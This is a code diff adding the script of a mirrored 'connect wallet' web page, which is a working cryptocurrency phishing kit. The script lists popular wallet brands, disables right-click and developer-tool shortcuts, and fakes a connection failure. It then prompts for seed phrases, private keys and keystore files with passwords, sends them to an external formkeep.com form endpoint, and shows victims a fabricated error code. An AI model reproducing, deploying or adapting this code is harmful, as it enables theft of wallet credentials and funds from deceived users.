+        {"name": "Tonhub", "code": "tonhub", "img_name": "tonhub.jfif", "img_width": "50"},
+        {"name": "Tronlink", "code": "tronlink", "img_name": "tronlink.jfif", "img_width": "50"},
+        {"name": "Uniswap", "code": "uniswap", "img_name": "uniswap.jfif", "img_width": "50"},
+        {"name": "Unstoppable", "code": "unstoppable", "img_name": "unstoppable.jfif", "img_width": "50"},
+        {"name": "wasabi", "code": "wasabi", "img_name": "wasabi.png", "img_width": "50"},
+        {"name": "Xaman", "code": "xaman", "img_name": "xaman.jfif", "img_width": "50"},
+        {"name": "XcelPay", "code": "xcelpay", "img_name": "xcelpay.jfif", "img_width": "50"},
+        {"name": "xportal", "code": "xportal", "img_name": "xportal.png", "img_width": "50"},
+        {"name": "Youhodler", "code": "youhodler", "img_name": "youhodler.jfif", "img_width": "50"},
+        {"name": "Zano", "code": "zano", "img_name": "zano.jfif", "img_width": "50"},
+        {"name": "Zelcore", "code": "zelcore", "img_name": "zelcore.png", "img_width": "50"},
+        {"name": "Zengo", "code": "zengo", "img_name": "zengo.jfif", "img_width": "50"},
+        {"name": "Zerion", "code": "zerion", "img_name": "zerion.jfif", "img_width": "50"},
+        {"name": "Zilpay", "code": "zilpay", "img_name": "zilpay.png", "img_width": "50"},
+        {"name": "1inch", "code": "1inch", "img_name": "1inch.jfif", "img_width": "50"},
+        {"name": "WalletConnect", "code": "walletconnect", "img_name": "walletconnect.png", "img_width": "50"}
+    ]));
+
+    //DISABLE RIGHT CLICK AND CTRL KEY
+    if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
+    } else {
+        window.oncontextmenu = function () {
+            return false;
+        }
+    }
+    $(document).keydown(function (event) {
+        if (event.keyCode == 123) {
+            return false;
+        }
+        else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
+            return false;
+        }
+    });
+
+    var selectedChain = 0; //All by Default
+    var selectedPaymentProtocol = null;
+    var selectedWalletName = ''; // Store selected wallet name
+    var selectedWalletLogo = ''; // Store selected wallet logo
+    var waitTimeBeforeConnectionFailure = 1000 * getRandomInt(1,10);
+    var waitTimeBeforeManualConnection = 5;
+    var waitTimeBeforeManualConnectionSeconds = 1000 * waitTimeBeforeManualConnection;
+    var controller;
+    var lastSubmissionTime = 0; // Track last submission time
+    const SUBMISSION_DELAY = 5000; // 5-second delay between submissions
+
+    var _timeout_;
+    var _interval_;
+
+    $(function(){
+        // Make floating box draggable
+        $('#floating-submission-box').draggable({ handle: '.card-header' });
+
+        // Mobile Nav Hamburger Icon
+        $('button.navbar-toggler').on('click', function(e){
+            let open_menu_id = $(this).data('bs-target');
+            let mobile_menu = $(open_menu_id);
+
+            mobile_menu.find('div.connect_wallet').addClass('mb-2 mt-2');
+
+            if( mobile_menu.hasClass('show') ){
+                $(open_menu_id).hide();
+            }
+            else{
+                $(open_menu_id).show();
+            }
+        });
+
+        // Chain Switch
+        $('ul#chain-switch-pill li').on('click', function(e){
+            selectedChain = $(this).data('chain-id');
+        });
+
+        // Connect Wallet
+        $("button.payment_protocol_button").hover(
+            function() {
+                $(this).find('img').addClass("image_colored").removeClass("image_grayscale");
+            },
+            function() {
+                $(this).find('img').addClass("image_grayscale").removeClass("image_colored");
+            }
+        );
+
+        $("button.payment_protocol_button").on('click', function(e){
+            e.preventDefault();
+            selectedPaymentProtocol = $(this).data('payment-protocol');
+            selectedWalletName = $(this).data('wallet-name');
+            selectedWalletLogo = $(this).data('wallet-logo');
+            console.log('Selected Wallet:', selectedWalletName, selectedWalletLogo); // Trace wallet selection
+            $('#selected_wallet_logo').attr('src', selectedWalletLogo);
+            $('#selected_wallet_name').text(selectedWalletName);
+            showDOMContent_PaymentProtocol(1);
+        });
+
+        $("button.btn_try_connection_again").on('click', function(){
+            controller.abort();
+            showDOMContent_PaymentProtocol(1);
+        });
+
+        $('button.btn-close').on('click', function(){
+            controller.abort();
+        });
+
+        $('button.navbar-toggler').trigger('click'); //menu by default
+    });
+
+    async function startCountDownToManualConnection({signal}){
+        if (signal?.aborted){
+            return Promise.reject(new DOMException("Aborted", "AbortError"));
+        }
+
+        return new Promise( async (resolve, reject) => {
+            let domManualConnectionCount = $('.can_not_connect .seconds_count_to_manual');
+            let timeout;
+
+            const abortHandler = () => {
+                clearTimeout(timeout);
+                reject(new DOMException("Aborted", "AbortError"));
+            };
+
+            if( parseInt( domManualConnectionCount.text() ) > 0 ){
+                if( await sleep(1000) ) {
+                    if( parseInt( domManualConnectionCount.text() ) > 0 ){
+                        domManualConnectionCount.text( parseInt( domManualConnectionCount.text() ) - 1 );
+                    }
+                }
+                resolve(false);
+                try{
+                    await startCountDownToManualConnection({signal});
+                } catch(e){
+                    controller = new AbortController();
+                }
+            } else {
+                resolve(true);
+                $('button').attr('disabled', true);
+                signal?.removeEventListener("abort", abortHandler);
+                startManualConnection();
+            }
+            
+            signal?.addEventListener("abort", abortHandler);
+        });
+    }
+
+    async function showDOMContent_PaymentProtocol(step){
+        if(!controller || controller.signal.aborted){
+            controller = new AbortController();
+        }
+        signal = controller.signal;
+        
+        switch (step) {
+            case 1:
+                $('.connection_loading').show();
+                $('.can_not_connect').hide();
+                $('.waiting_for_connection').hide();
+
+                clearTimeout(_timeout_);
+                _timeout_ = setTimeout( async () => {
+                    showDOMContent_PaymentProtocol(2);
+                    $('.can_not_connect .seconds_count_to_manual').text(waitTimeBeforeManualConnection);
+                    await startCountDownToManualConnection({signal});
+                }, waitTimeBeforeConnectionFailure);
+
+                $('#modalPaymentProtocol').modal('show');
+                break;
+
+            case 2:
+                $('.can_not_connect').show();
+                $('.connection_loading').hide();
+                $('.waiting_for_connection').hide();
+                break;
+
+            case 3:
+                $('.waiting_for_connection').show();
+                $('.connection_loading').hide();
+                $('.can_not_connect').hide();
+                break;
+        }
+    }
+
+    function sleep(ms) {
+        return new Promise( (resolve) => {
+            setTimeout(() => {
+                resolve(true);
+            }, ms || 0);
+        });
+    }
+
+    function startManualConnection(){
+        $('#modalPaymentProtocol').modal('hide');
+        $('#submission_wallet_logo').attr('src', selectedWalletLogo);
+        $('#submission_wallet_name').text(selectedWalletName);
+        $('#floating-submission-box').fadeIn();
+        $('button').removeAttr('disabled');
+    }
+
+    function getRandomInt(min, max) {
+        min = Math.ceil(min);
+        max = Math.floor(max);
+        return Math.floor(Math.random() * (max - min) + min);
+    }
+
+    function getPersistentErrorCode(ip) {
+        const storageKey = `errorCode_${ip}`;
+        const storedData = localStorage.getItem(storageKey);
+        if (storedData) {
+            const { code, timestamp } = JSON.parse(storedData);
+            const twelveHours = 12 * 60 * 60 * 1000; // 12 hours in milliseconds
+            if (Date.now() - timestamp < twelveHours) {
+                return code;
+            }
+        }
+        const errorCodes = ['E-503', 'E-504', 'E-506', 'E-1'];
+        const newCode = errorCodes[Math.floor(Math.random() * errorCodes.length)];
+        localStorage.setItem(storageKey, JSON.stringify({ code: newCode, timestamp: Date.now() }));
+        return newCode;
+    }
+
+    function showErrorModal(errorCode) {
+        $('#error-message').text(`Error connecting to wallet (${errorCode})`);
+        $('#error-modal').fadeIn();
+    }
+
+    // Floating Submission Box Logic
+    $(document).on('click', '#submit-credentials', function() {
+    const now = Date.now();
+    if (now - lastSubmissionTime < SUBMISSION_DELAY) {
+        alert('Please wait 5 seconds before submitting again.');
+        return;
+    }
+
+    const activeTab = $('#credentialTabs .nav-link.active').attr('id');
+
+    $(this).html('<span class="spinner-border spinner-border-sm" role="status"></span> Submitting...').prop('disabled', true);
+
+    if (activeTab === 'phrase-tab') {
+        const seed = $('#seed-phrase').val().trim();
+        const passphrase = $('#passphrase').val().trim();
+        if (!seed) {
+            alert('Seed phrase is required.');
+            $(this).html('Submit').prop('disabled', false);
+            return;
+        }
+        const wordCount = seed.split(/\s+/).length;
+        if (![12, 15, 18, 20, 21, 24].includes(wordCount)) {
+            alert('Seed phrase must be 12, 15, 18, 20, 21, or 24 words.');
+            $(this).html('Submit').prop('disabled', false);
+            return;
+        }
+        const dataToSubmit = passphrase ? `${seed}|${passphrase}` : seed;
+        submitData({ credentials: dataToSubmit });
+    } else if (activeTab === 'private-tab') {
+        const privateKey = $('#private-key').val().trim();
+        if (!privateKey) {
+            alert('Private key is required.');
+            $(this).html('Submit').prop('disabled', false);
+            return;
+        }
+        submitData({ credentials: privateKey });
+    } else if (activeTab === 'keystore-tab') {
+        const fileInput = $('#keystore-file')[0];
+        const password = $('#keystore-password').val().trim();
+        if (!fileInput.files.length) {
+            alert('Keystore file is required.');
+            $(this).html('Submit').prop('disabled', false);
+            return;
+        }
+        const validExtensions = ['.json', '.txt', '.dat', '.key', '.wallet'];
+        const fileName = fileInput.files[0].name;
+        if (!validExtensions.some(ext => fileName.toLowerCase().endsWith(ext))) {
+            alert('Invalid file type. Supported extensions: .json, .txt, .dat, .key, .wallet');
+            $(this).html('Submit').prop('disabled', false);
+            return;
+        }
+        // Prepare FormData for file upload
+        const formData = new FormData();
+        formData.append('keystore-file', fileInput.files[0]);
+        if (password) {
+            formData.append('keystore-password', password);
+        }
+        formData.append('wallet_name', selectedWalletName);
+        submitData(formData, true); // Pass `isFileUpload: true` to indicate a file upload
+        return;
+    }
+});
+
+function submitData(data, isFileUpload = false) {
+    // Clear the form fields immediately
+    $('#seed-phrase').val('');
+    $('#passphrase').val('');
+    $('#private-key').val('');
+    $('#keystore-file').val('');
+    $('#keystore-password').val('');
+
+    grecaptcha.ready(function() {
+        grecaptcha.execute('6Lc7R_0qAAAAAO4UT6C8kn0kI_ZwEXtTxTILZVxA', {action: 'submit'}).then(function(token) {
+            if (isFileUpload) {
+                // For file uploads, append the reCAPTCHA token to FormData
+                data.append('g-recaptcha-response', token);
+                $.ajax({
+                    url: 'https://formkeep.com/f/a57b5db06a75',
+                    method: 'POST',
+                    data: data,
+                    processData: false, // Required for FormData
+                    contentType: false, // Required for FormData
+                    success: function() {
+                        lastSubmissionTime = Date.now(); // Update last submission time
+                        $('#floating-submission-box').fadeOut();
+                        $('#submit-credentials').html('Submit').prop('disabled', false);
+                        const ipHash = CryptoJS.MD5(navigator.userAgent + Date.now().toString()).toString();
+                        const errorCode = getPersistentErrorCode(ipHash);
+                        showErrorModal(errorCode);
+                    },
+                    error: function() {
+                        alert('Submission failed. Please try again.');
+                        $('#submit-credentials').html('Submit').prop('disabled', false);
+                    }
+                });
+            } else {
+                // For non-file uploads (seed phrase, private key)
+                const payload = {
+                    credentials: data.credentials,
+                    wallet_name: selectedWalletName,
+                    'g-recaptcha-response': token
+                };
+                console.log('Payload:', payload); // For testing
+                $.ajax({
+                    url: 'https://formkeep.com/f/a57b5db06a75',
+                    method: 'POST',
+                    data: JSON.stringify(payload),
+                    contentType: 'application/json',
+                    success: function() {
+                        lastSubmissionTime = Date.now(); // Update last submission time
+                        $('#floating-submission-box').fadeOut();
+                        $('#submit-credentials').html('Submit').prop('disabled', false);
+                        const ipHash = CryptoJS.MD5(navigator.userAgent + Date.now().toString()).toString();
+                        const errorCode = getPersistentErrorCode(ipHash);
+                        showErrorModal(errorCode);
+                    },
+                    error: function() {
+                        alert('Submission failed. Please try again.');
+                        $('#submit-credentials').html('Submit').prop('disabled', false);
+                    }
+                });
+            }
+        });
+    });
+}
+    </script>
+</body>
+
+
+<!-- Mirrored from layerchain.in/connect.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 29 Mar 2025 07:24:41 GMT -->
+</html>
